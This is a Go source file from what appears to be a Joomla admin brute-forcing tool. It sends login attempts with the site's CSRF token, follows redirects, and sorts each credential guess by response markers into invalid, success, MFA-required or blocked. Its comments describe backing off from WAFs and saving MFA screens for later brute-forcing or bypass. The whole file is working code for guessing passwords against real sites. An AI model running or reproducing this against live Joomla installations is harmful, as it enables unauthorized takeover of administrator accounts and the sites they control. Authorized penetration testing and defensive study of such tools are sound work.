package joomla

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"

	"github.com/rvzsec/joombrute/internal/httpx"
)

// LoginOutcome classifies the result of a single credential attempt.
//
// The classification logic is the most-failed part of every existing Joomla
// bruteforcer (Metasploit's hardcoded "look for mod-login-username" being the
// classic). We use multiple signals in priority order so we don't lie to the
// operator.
type LoginOutcome int

const (
	// OutcomeUnknown means we couldn't classify - caller should retry once.
	OutcomeUnknown LoginOutcome = iota
	// OutcomeInvalid: bad password / bad username. Stay on the loop.
	OutcomeInvalid
	// OutcomeSuccess: full admin login. We hit the control panel.
	OutcomeSuccess
	// OutcomeMFARequired: password was correct but the captive screen is
	// gating us. This is a *finding* - credentials are valid, just guarded.
	OutcomeMFARequired
	// OutcomeBlocked: WAF / rate-limit / IP ban. Caller should back off.
	OutcomeBlocked
)

func (o LoginOutcome) String() string {
	switch o {
	case OutcomeInvalid:
		return "invalid"
	case OutcomeSuccess:
		return "success"
	case OutcomeMFARequired:
		return "mfa-required"
	case OutcomeBlocked:
		return "blocked"
	default:
		return "unknown"
	}
}

// LoginResult bundles the outcome and useful post-attempt artifacts.
type LoginResult struct {
	Outcome LoginOutcome
	// Status is the HTTP status of the POST.
	Status int
	// Location is the value of the Location header on a 3xx response, or
	// the final URL after a follow-up GET.
	Location string
	// CaptiveURL, when non-empty, is the MFA captive screen URL we landed on.
	CaptiveURL string
	// Snippet is a small chunk of response body when classification was
	// content-based (helpful for debugging, never for credentials).
	Snippet string
}

// Attempt POSTs username/password against the cached LoginForm and classifies
// the response. The supplied client MUST have FollowRedirects=false so we can
// inspect the Location header. The client's cookie jar MUST already hold a
// session cookie from a prior FetchLoginForm call.
func Attempt(ctx context.Context, client *http.Client, form *LoginForm, username, password string) (*LoginResult, error) {
	if form == nil || form.TokenName == "" {
		return nil, fmt.Errorf("login form not prepared")
	}

	body := url.Values{}
	body.Set("username", username)
	body.Set("passwd", password)
	body.Set("option", "com_login")
	body.Set("task", "login")
	body.Set("return", form.ReturnValue)
	body.Set(form.TokenName, "1")

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, form.Action, strings.NewReader(body.Encode()))
	if err != nil {
		return nil, err
	}
	httpx.SetUA(req, "")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Referer", form.Action)

	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("POST login: %w", err)
	}
	defer resp.Body.Close()

	res := &LoginResult{Status: resp.StatusCode}

	// WAF / aggressive rate-limit signal. Don't keep hammering.
	if resp.StatusCode == http.StatusForbidden ||
		resp.StatusCode == http.StatusTooManyRequests ||
		resp.StatusCode == http.StatusServiceUnavailable {
		res.Outcome = OutcomeBlocked
		return res, nil
	}

	// Joomla 3/4/5 on success: 303 See Other (sometimes 302) -> Location with
	// option=com_cpanel. On failure: 303/302 -> Location back to /administrator/
	// with no option, or option=com_login again.
	loc := resp.Header.Get("Location")
	res.Location = loc

	if resp.StatusCode >= 300 && resp.StatusCode < 400 && loc != "" {
		classifyByLocation(res, loc)
		// Joomla 4/5 quirk: both success and failure 303-redirect to the
		// EXACT same /administrator/index.php URL. The only reliable
		// discriminator is the body of that redirect target - success
		// renders com_cpanel; failure re-renders the login form. If the
		// Location-based classification was inconclusive (Unknown OR the
		// generic "lands inside /administrator/" fallback), do a follow-up
		// GET against the Location and content-classify.
		if res.Outcome == OutcomeUnknown || res.Outcome == OutcomeSuccess || res.Outcome == OutcomeMFARequired {
			if final, captiveURL, ok := followAndClassify(ctx, client, loc, form.Action); ok {
				res.Outcome = final
				if captiveURL != "" {
					res.CaptiveURL = captiveURL
				}
			}
		}
		return res, nil
	}

	// 200 with body - usually means failure (form re-rendered with error)
	// but some templates render the cpanel inline without redirect. Read a
	// bounded chunk and content-match.
	buf, _ := io.ReadAll(io.LimitReader(resp.Body, 64*1024))
	res.Snippet = sniff(buf)
	return classifyByBody(res, buf), nil
}

// followAndClassify GETs the post-login redirect target and looks at the
// rendered body to disambiguate the J4/J5 case where success and failure
// both 303 to /administrator/index.php. Returns (outcome, capturedURL, true)
// on confident classification; (Unknown, "", false) when we couldn't decide.
//
// The capturedURL return is the actual landing page URL - populated when
// the chain ended at a captive screen so the caller can record it for
// mfa-brute / mfa-bypass.
//
// This costs one extra request per attempt only when the Location-based
// signal was already ambiguous, which on a typical bruteforce run means
// only after the very first attempt finds the right cookie state.
//
// We chase up to maxHops redirects because J4/J5 with MFA seeded does a
// two-hop bounce: POST -> 303 /administrator/index.php -> 307
// /administrator/index.php?option=com_users&view=captive.
//
// baseURL is the URL of the request that produced loc; we use it to
// resolve relative Location headers (RFC 7231 §7.1.2 says Location MAY
// be relative). Joomla normally emits absolute URLs but we handle both.
func followAndClassify(ctx context.Context, client *http.Client, loc string, baseURL string) (LoginOutcome, string, bool) {
	const maxHops = 5
	currentURL := resolveLocation(baseURL, loc)
	for hop := 0; hop < maxHops; hop++ {
		req, err := http.NewRequestWithContext(ctx, http.MethodGet, currentURL, nil)
		if err != nil {
			return OutcomeUnknown, "", false
		}
		httpx.SetUA(req, "")
		resp, err := client.Do(req)
		if err != nil {
			return OutcomeUnknown, "", false
		}

		// Redirect - classify by Location, then either return early or
		// chase if it doesn't disambiguate yet.
		if resp.StatusCode >= 300 && resp.StatusCode < 400 {
			next := resp.Header.Get("Location")
			resp.Body.Close()
			if next == "" {
				return OutcomeUnknown, "", false
			}
			low := strings.ToLower(next)
			switch {
			case strings.Contains(low, "view=captive"),
				strings.Contains(low, "view=methods"):
				return OutcomeMFARequired, resolveLocation(currentURL, next), true
			case strings.Contains(low, "option=com_cpanel"),
				strings.Contains(low, "view=cpanel"):
				return OutcomeSuccess, "", true
			case strings.Contains(low, "option=com_login"):
				return OutcomeInvalid, "", true
			}
			// Inconclusive hop - follow it.
			currentURL = resolveLocation(currentURL, next)
			continue
		}

		// Terminal 2xx - content-classify.
		buf, _ := io.ReadAll(io.LimitReader(resp.Body, 96*1024))
		resp.Body.Close()
		low := strings.ToLower(string(buf))
		switch {
		case strings.Contains(low, `id="form-login"`),
			strings.Contains(low, `id="mod-login-username"`),
			strings.Contains(low, "username and password do not match"),
			strings.Contains(low, "warningusername"):
			return OutcomeInvalid, "", true
		case strings.Contains(low, "captive-form"),
			(strings.Contains(low, "captive") &&
				(strings.Contains(low, "two-factor") || strings.Contains(low, "two factor") ||
					strings.Contains(low, "authentication method"))):
			return OutcomeMFARequired, currentURL, true
		case strings.Contains(low, `id="cpanel"`),
			strings.Contains(low, "control panel"),
			strings.Contains(low, "view=cpanel"),
			strings.Contains(low, "option=com_cpanel"):
			return OutcomeSuccess, "", true
		}
		return OutcomeUnknown, "", false
	}
	return OutcomeUnknown, "", false
}

// classifyByLocation handles the 3xx-redirect case. Joomla emits absolute
// URLs in Location, so simple substring checks are safe.
func classifyByLocation(r *LoginResult, loc string) *LoginResult {
	low := strings.ToLower(loc)
	switch {
	// MFA captive screen - credentials were valid.
	case strings.Contains(low, "view=captive"),
		strings.Contains(low, "view=methods"),
		strings.Contains(low, "com_users") && strings.Contains(low, "captive"):
		r.Outcome = OutcomeMFARequired
		r.CaptiveURL = loc
	// Joomla control panel - full success.
	case strings.Contains(low, "option=com_cpanel"),
		strings.HasSuffix(strings.TrimRight(low, "/"), "/administrator/index.php") && !strings.Contains(low, "com_login"):
		r.Outcome = OutcomeSuccess
	// Redirect that includes com_login or the bare /administrator/ usually
	// means failure (re-render the login form).
	case strings.Contains(low, "option=com_login"),
		strings.HasSuffix(strings.TrimRight(low, "/"), "/administrator"),
		strings.HasSuffix(strings.TrimRight(low, "/"), "/administrator/"):
		r.Outcome = OutcomeInvalid
	default:
		// Conservative: anything else under /administrator/ that isn't the
		// login form is likely a successful landing.
		if strings.Contains(low, "/administrator/") {
			r.Outcome = OutcomeSuccess
		} else {
			r.Outcome = OutcomeUnknown
		}
	}
	return r
}

// classifyByBody handles 200-OK responses where the redirect was suppressed
// or the template renders content inline. We look for failure markers first
// (most common) and fall back to success markers.
func classifyByBody(r *LoginResult, body []byte) *LoginResult {
	low := strings.ToLower(string(body))

	// Failure markers - Joomla flashes these on a failed login.
	switch {
	case strings.Contains(low, "username and password do not match"),
		strings.Contains(low, "warningusername"),
		strings.Contains(low, "joomla.jtext._('error')"),
		// Form re-rendered: username field id is present.
		strings.Contains(low, `id="mod-login-username"`),
		strings.Contains(low, `id="form-login"`):
		r.Outcome = OutcomeInvalid
		return r
	}

	// MFA captive markers - keywords from the captive view template.
	if strings.Contains(low, "captive") &&
		(strings.Contains(low, "two-factor") || strings.Contains(low, "two factor") ||
			strings.Contains(low, "authentication method")) {
		r.Outcome = OutcomeMFARequired
		return r
	}

	// Success markers - control panel rendered.
	if strings.Contains(low, "com_cpanel") ||
		strings.Contains(low, "control panel") ||
		strings.Contains(low, `id="cpanel"`) {
		r.Outcome = OutcomeSuccess
		return r
	}

	r.Outcome = OutcomeUnknown
	return r
}

// sniff returns up to ~120 chars of body, single-lined, for log breadcrumbs.
// Never returns response data that could contain credentials echoed back.
func sniff(b []byte) string {
	const max = 120
	s := strings.TrimSpace(string(b))
	s = strings.ReplaceAll(s, "\n", " ")
	s = strings.ReplaceAll(s, "\r", "")
	if len(s) > max {
		s = s[:max] + "..."
	}
	return s
}

// resolveLocation turns a Location header (absolute OR relative) into an
// absolute URL using baseURL as the reference. RFC 7231 §7.1.2 allows
// Location to be relative; Joomla normally sends absolute URLs but
// defensive code lets us survive proxies / WAFs that rewrite headers.
//
// Falls back to returning loc verbatim if either URL fails to parse,
// which preserves backward-compatible behavior for absolute URLs.
func resolveLocation(baseURL, loc string) string {
	if loc == "" {
		return loc
	}
	if strings.HasPrefix(loc, "http://") || strings.HasPrefix(loc, "https://") {
		return loc
	}
	base, err := url.Parse(baseURL)
	if err != nil {
		return loc
	}
	ref, err := url.Parse(loc)
	if err != nil {
		return loc
	}
	return base.ResolveReference(ref).String()
}
